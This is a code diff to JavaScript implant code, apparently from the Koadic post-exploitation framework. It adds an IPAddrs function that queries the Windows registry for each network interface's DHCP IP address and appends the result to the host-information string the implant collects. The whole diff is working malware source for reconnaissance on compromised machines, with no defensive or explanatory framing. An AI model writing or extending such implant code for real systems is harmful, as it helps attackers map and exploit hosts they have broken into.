@@ -222,13 +222,34 @@ Koadic.user.CWD = function()
 {
     try
     {
-        cwd = Koadic.shell.exec("cd", "%TEMP%\\cwd.txt");
+        var cwd = Koadic.shell.exec("cd", "%TEMP%\\cwd.txt");
         return cwd;
     }
     catch(e)
     {}
 
     return "";
+}
+
+Koadic.user.IPAddrs = function()
+{
+    var interfaces = Koadic.shell.exec("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces", "%TEMP%\\"+Koadic.uuid()+".txt");
+    var interfacearray = interfaces.split("\n");
+    var retstring = "";
+    var interfaceid = "";
+    for (var i=1;i<interfacearray.length-1;i++)
+    {
+        interfaceid = interfacearray[i].split("\\")[interfacearray[i].split("\\").length-1];
+        try
+        {
+            var interface = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces\\"+interfaceid;
+            var res = Koadic.shell.exec("reg query "+interface+" /v DhcpIPAddress", "%TEMP%\\"+Koadic.uuid()+".txt");
+            retstring += res.split("REG_SZ")[1].split("\r\n")[0]+"___"
+        }
+        catch(e)
+        {continue;}
+    }
+    return retstring;
 }
 
 
@@ -245,6 +266,7 @@ Koadic.user.info = function()
     info += "~~~" + Koadic.user.DC();
     info += "~~~" + Koadic.user.Arch();
     info += "~~~" + Koadic.user.CWD();
+    info += "~~~" + Koadic.user.IPAddrs();
 
     return info;
 }
